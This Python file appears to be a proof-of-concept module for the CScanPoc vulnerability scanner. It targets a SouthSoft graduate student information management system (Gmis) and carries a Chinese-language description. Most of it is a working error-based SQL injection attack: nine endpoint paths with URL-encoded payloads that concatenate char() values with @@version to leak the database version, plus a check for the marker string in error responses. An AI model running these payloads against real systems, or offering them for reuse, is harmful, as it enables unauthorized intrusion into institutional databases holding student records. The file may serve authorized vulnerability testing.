# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'SouthSoft_0005'  # 平台漏洞编号，留空
    name = '南软研究生信息管理系统SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-04'  # 漏洞公布时间
    desc = '''
        南软研究生信息管理系统SQL注入漏洞。
        Gmis/pygl/kcxxwh_jsedit.aspx?kcbh=1201132
        Gmis/pygl/jxsjsh_ds.aspx?xh=200902100005
        Gmis/pygl/cjxshdlist.aspx?xh=200902100005
        Gmis/dtjygl/dzbadd.aspx?id=1
        Gmis/cjgl/zqsxsh.aspx?xh=200902100005
        Gmis/Byyxwgl/bydbjgcxmx.aspx?id=1
        gmis/SysMsg/sys_useEdit.aspx?id=
        gmis/ZS/fbzsjzInfoedit.aspx?ID=
        Gmis/xw/fwhtlgjscedit.aspx?id=
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=098771
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SouthSoft'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1ac097f4-c634-48a0-8092-b096e200304e'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                'Gmis/pygl/kcxxwh_jsedit.aspx?kcbh=1201132%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                'Gmis/pygl/jxsjsh_ds.aspx?xh=200902100005%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                'Gmis/pygl/cjxshdlist.aspx?xh=200902100005%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                'Gmis/dtjygl/dzbadd.aspx?id=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                'Gmis/cjgl/zqsxsh.aspx?xh=200902100005%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                'Gmis/Byyxwgl/bydbjgcxmx.aspx?id=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                'gmis/SysMsg/sys_useEdit.aspx?id=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                'gmis/ZS/fbzsjzInfoedit.aspx?ID=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
                'Gmis/xw/fwhtlgjscedit.aspx?id=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--'
            ]
            for p in ps:
                url = arg+p
                code, head, res, errcode, _ = hh.http(url)
                if code == 500 and "GAOJIMicrosoft" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
